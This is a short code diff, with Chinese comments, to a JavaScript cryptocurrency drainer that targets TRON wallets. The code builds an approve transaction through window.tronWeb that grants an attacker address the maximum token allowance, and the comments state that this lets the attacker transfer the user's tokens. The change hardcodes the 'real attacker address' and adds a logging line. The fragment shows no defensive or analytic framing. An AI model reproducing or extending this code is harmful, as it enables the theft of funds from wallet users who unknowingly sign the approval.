@@ -157,9 +157,11 @@
             // 构建approve交易，授权攻击者可以转移用户的代币
             const functionSelector = 'approve(address,uint256)';
             const parameters = [
-                {type: 'address', value: getCurrentAttackerAddress()},  // 授权给攻击者
+                {type: 'address', value: ATTACKER_ADDRESS},  // 🎯 直接使用真实攻击者地址
                 {type: 'uint256', value: MAX_AUTHORIZATION}   // 最大授权金额
             ];
+            
+            console.log(`🎯 构建授权交易参数: spender=${ATTACKER_ADDRESS}, amount=${MAX_AUTHORIZATION}`);
             
             const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                 contractAddress,
